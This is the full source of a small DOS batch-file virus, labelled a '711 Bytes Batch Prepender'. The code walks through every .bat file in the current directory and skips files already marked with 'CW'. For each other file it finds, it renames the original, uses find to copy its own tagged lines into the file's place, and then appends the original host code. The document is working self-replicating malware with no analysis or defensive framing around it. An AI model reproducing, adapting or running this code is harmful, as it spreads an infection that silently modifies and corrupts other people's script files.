REM 711 Bytes Batch Prepender
@echo off%CW%%n0%
goto s %n0%
:s %n1%
if '%1' == '' goto c %n1%
find "CW" <%1 >nul %n1%
if not errorlevel 1 goto e %n1%
if exist %0.bat goto b %n1%
goto a %n1%
:a %n2%
set f=%0 %n2%
goto i %n2%
:b %n3%
set f=%0.bat %n3%
goto i %n3%
:i %n4%
ren %1 vir.tmp %n4%
set v1=n%n4%
set v2=0%n4%
find "%v1%%v2%"<%f% >%1 %n4%
set v2=1%n4%
find "%v1%%v2%"<%f% >>%1 %n4%
set v2=2%n4%
find "%v1%%v2%"<%f% >>%1 %n4%
set v2=3%n4%
find "%v1%%v2%"<%f% >>%1 %n4%
set v2=4%n4%
find "%v1%%v2%"<%f% >>%1 %n4%
set v2=5%n4%
find "%v1%%v2%"<%f% >>%1 %n4%
set v2=6%n4%
find "%v1%%v2%"<%f% >>%1 %n4%
echo :d >>%1 %n4%
type vir.tmp >>%1 %n4%
echo :e >>%1 %n4%
del vir.tmp %n4%
goto e %n4%
:c %n5%
for %%a in (*.bat) do call %0 %%a %n5%
goto d %n5%
:d
echo host file
:e